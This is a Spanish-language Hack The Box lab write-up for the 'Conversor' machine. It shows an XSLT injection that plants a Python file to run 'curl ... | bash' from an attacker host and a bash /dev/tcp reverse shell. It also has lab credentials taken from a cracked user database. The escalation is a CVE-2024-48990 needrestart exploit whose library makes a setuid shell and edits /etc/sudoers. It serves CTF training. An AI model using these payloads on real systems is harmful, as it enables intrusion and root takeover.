---

title: "Conversor Hack The Box"
date: "2025-10-1"
description: "Maquina facil, subida de archivos xslt y  abuso de binario needrestart "
difficulty: "Easy"
tags: ["nmap","needrestart", "xslt" ]


---
![Banner SoulMate](/img/conversorportada.png)
---

### 📌 Escaneos
---

- Comando usado:

   ```bash
   nmap -sSCV -p- --open -T4 -Pn -n -vvv -oN escaneo_nmap.txt -oX escaneo_nmap.xml <IP>
   ```


---
### 📦 Puertos y Servicios Descubiertos
---

- Captura:

```bash
PORT   STATE SERVICE REASON         VERSION

22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://conversor.htb/

Service Info: Host: conversor.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

---
### 📂 Hallazgos

---
**Index**

![alt text](<../../../public/img/CONVERSOR (8).png>)


**index logeado**

![alt text](<../../../public/img/CONVERSOR (9).png>)





- Traducción:

"Somos Conversor. ¿Alguna vez has realizado escaneos extensos con Nmap y has deseado una visualización más atractiva? ¡Tenemos la solución! Solo tienes que subir tu archivo XML junto con la hoja XSLT para transformarlo a un formato más estético. Si lo prefieres, también puedes descargar la plantilla que hemos desarrollado aquí: Descargar plantilla."

**Archivo generado con documentos vacios**

![!\[\[Pasted image 20251029194451.png\]\]](<../../../public/img/CONVERSOR (10).png>)   


**About**

![!\[\[Pasted image 20251029195331.png\]\]](<../../../public/img/CONVERSOR (11).png>)

**source code**

```bash

├── app.py
├── app.wsgi
├── install.md
├── instance
│   └── users.db
├── scripts
├── static
│   ├── images
│   │   ├── arturo.png
│   │   ├── david.png
│   │   └── fismathack.png
│   ├── nmap.xslt
│   └── style.css
├── templates
│   ├── about.html
│   ├── base.html
│   ├── index.html
│   ├── login.html
│   ├── register.html
│   └── result.html
└── uploads

```

**install.md**

```bash
 File: install.md
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ To deploy Conversor, we can extract the compressed file:
   2   │ 
   3   │ """
   4   │ tar -xvf source_code.tar.gz
   5   │ """
   6   │ 
   7   │ We install flask:
   8   │ 
   9   │ """
  10   │ pip3 install flask
  11   │ """
  12   │ 
  13   │ We can run the app.py file:
  14   │ 
  15   │ """
  16   │ python3 app.py
  17   │ """
  18   │ 
  19   │ You can also run it with Apache using the app.wsgi file.
  20   │ 
  21   │ If you want to run Python scripts (for example, our server deletes all files older than 60 minutes to avoid system overload), you can add the following line to              your /etc/crontab. # Si quieres ejecutar scripts de Python (por ejemplo, nuestro servidor elimina todos los archivos con más de 60 minutos de antigüedad para                evitar la sobrecarga del sistema), puedes añadir la siguiente línea a tu archivo /etc/crontab.
  22   │ 
  23   │ """
  24   │ * * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
  25   │ """
```

### Qué hace concretamente

Cada minuto, como usuario `www-data`, el shell hace:

1. Expande el patrón `/var/www/conversor.htb/scripts/*.py` a la lista de archivos coincidentes.
    
2. Para cada archivo `f` resultante ejecuta `python3 "$f"`.
    
    - La comilla `"$f"` evita problemas con espacios o caracteres especiales en nombres de archivo.
        
3. Si no hay archivos que coincidan, dependiendo del shell el patrón puede quedar literal (intento de ejecutar `python3 /var/www/.../*.py` y fallar) — cron normalmente usa `/bin/sh`.



### Riesgos de seguridad (importante)

- Si un atacante puede **escribir o modificar** archivos en `/var/www/conversor.htb/scripts/`, puede meter un `.py` malicioso y lograr **ejecución de código** como `www-data` — escalado lateral posible.
    
- Ejecutar todo el contenido de un directorio sin control es peligroso: ficheros temporales, subidas por web, o symlinks podrían explotarse.
    
- Ejecutar con `www-data` evita ejecución como root, pero aún puede permitir persistencia, exfiltración o pivot dentro del sistema si hay vulnerabilidades.


### Informacion Posiblemente Util

contact@conversor.htb

app.secret_key = 'C0nv3rs0rIsthek3y29'

---
### 📂 Resumen
---

- Tecnologías: Apache HTTP Server 2.4.52, Python3
     
- Recurso accesibles: Source Code de Aplicacion

---

## 💥 Explotación

- Como tenemos la posibilidad de subir archivos xslt podemos crear una carga maliciosa que se suba oculto en el archivo, para entender mejor esto visita este recurso: https://ine.com/blog/xslt-injections-for-dummies

## XSLT Injections


**shell.xslt**

```bash
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet 
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform" 
    xmlns:shell="http://exslt.org/common"
    extension-element-prefixes="shell"
    version="1.0"
>
<xsl:template match="/">
<shell:document href="/var/www/conversor.htb/scripts/shell.py" method="text"># Debemos darle una extensíon .py
import os
os.system("curl <IP-ATACANTE>:8000/shell.sh|bash")
</shell:document>
</xsl:template>
</xsl:stylesheet>
```

**shell.sh**

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.16.100/9001 0>&1
```

- Debemos levantar un servidor en la misma ubicación que el archivo y con el puerto que indicamos en el archivo e iniciar un oyente en este caso en el puerto 9001.

![!\[\[Pasted image 20251031203936.png\]\]](<../../../public/img/CONVERSOR (12).png>)

- Somos el usuario www-data, encontramos la carpeta conversor.htb 

![alt text](<../../../public/img/CONVERSOR (4).png>)

- Encontramos el directorio instance, en ella existe el archivo users.db, lo descargamos a nuestra maquina para analizarlo. 

![alt text](<../../../public/img/CONVERSOR (13).png>)

![!\[\[Pasted image 20251031212600.png\]\]](<../../../public/img/CONVERSOR (1).png>)

- Lo desciframos en https://crackstation.net/ 

![!\[\[Pasted image 20251031213519.png\]\]](<../../../public/img/CONVERSOR (5).png>)

- Encontramos la credencial y probamos con hydra logrando resultados positivos

```bash
[22][ssh] host: conversor.htb   login: fismathack   password: Keepmesafeandwarm
```
---
### 🔗 Credenciales

-  Usuario: `fismathack`
    
-  Contraseña: `Keepmesafeandwarm`
    
-  Origen (FTP/SSH/Web): `Base de Datos -> users.db`
    
---

## 🛡️ Escalada

```bash
bash-5.1$ sudo -l  
Matching Defaults entries for fismathack on conversor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User fismathack may run the following commands on conversor:
    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
```


- Encontamos que podemos ejecutar el binario `needrestart` sin contraseña

- El binario "needrestart" es una herramienta utilizada en sistemas Linux, especialmente en distribuciones basadas en Ubuntu, para gestionar la necesidad de reiniciar servicios tras actualizaciones del sistema. Su función principal es detectar qué servicios deben reiniciarse para que las actualizaciones aplicadas, especialmente librerías compartidas, se apliquen correctamente sin tener que reiniciar todo el sistema

---

- La versión needrestart es antigua:

```bash
sudo /usr/sbin/needrestart -v   
needrestart v3.7   
```

- Por lo tanto, es posible usar CVE-2024–48990 para obtener una shell, pero el objetivo no tiene gcc, por lo que necesitamos construir lib.c en nuestra máquina y compilarlo con gcc.

https://github.com/pentestfunctions/CVE-2024-48990-PoC-Testing   

**Primero crea lib.c en tu maquina**

```bash
cat lib.c 

#include <stdio.h   
#include <stdlib.h>   
#include <sys/types.h>   
#include <unistd.h>   
  
static void a() __attribute__((constructor));   
  
void a() {   
    if(geteuid() == 0) { // Solo se ejecuta si se ejecuta con privilegios de root   
        setuid(0);   
        setgid(0);   
        const char *shell = "cp /bin/sh /tmp/poc; "   
                            "chmod u+s /tmp/poc; "   
                            "grep -qxF 'ALL ALL=NOPASSWD: /tmp/poc' /etc/sudoers || "   
                            "echo 'ALL ALL=NOPASSWD: /tmp/poc' | tee -a /etc/sudoers > /dev/null &";   
        system(shell);   
    }   
}   
```

- Ejecutamos para compilar en nuestra maquina atacante

```bash
x86_64-linux-gnu-gcc -shared -fPIC -o __init__.so lib.c
```


- Luego modificamos runner.sh, eliminamos la parte de lib.c y cambiamos gcc por curl, el __init__.so que acabamos de compilar.

**runner.sh**

```bash
#!/bin/bash  
set -e  
cd /tmp  
mkdir -p malicious/importlib  
  
#chage to your ip and open python http server  
curl http://<IP-ATACANTE>:8000/__init__.so -o /tmp/malicious/importlib/__init__.so  
  
# Minimal Python script to trigger import  
cat << 'EOF' > /tmp/malicious/e.py  
import time  
while True:  
try:  
import importlib  
except:  
pass  
if __import__("os").path.exists("/tmp/poc"):  
print("Got shell!, delete traces in /tmp/poc, /tmp/malicious")  
__import__("os").system("sudo /tmp/poc -p")  
break  
time.sleep(1)  
EOF  
  
cd /tmp/malicious; PYTHONPATH="$PWD" python3 e.py 2>/dev/null
```

  
- Inicia un servidor

```bash
python3 -m http.server  
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```    

- Despues en la maquina victima descargamos el archivo, le damos permisos de ejecución y lo ejecutamos 

```bash
wget http://10.10.14.118:8000/runner.sh  
fismathack@conversor:/dev/shm$ chmod +x runner.sh  
fismathack@conversor:/dev/shm$ ./runner.sh
```

**Importante**

- Después de ejecutar runner.sh, necesitamos abrir otra ventana ssh y ejecutar 
`sudo/usr/sbin/needrestart` para obtener el shell de root.
  
   
![alt text](<../../../public/img/CONVERSOR (7).png>)

---

## 🛡️ Escalada 2 Camino alternativo ?


- En esta maquina ocurrió que al intentar hacerla una segunda vez por temas educativos encontré otra forma realmente sencilla, no se si es un error o era otra opción desde el comienzo. 

![alt text](<../../../public/img/CONVERSOR (6).png>)

![!\[\[Pasted image 20251031221607.png\]\]](<../../../public/img/CONVERSOR (3).png>)

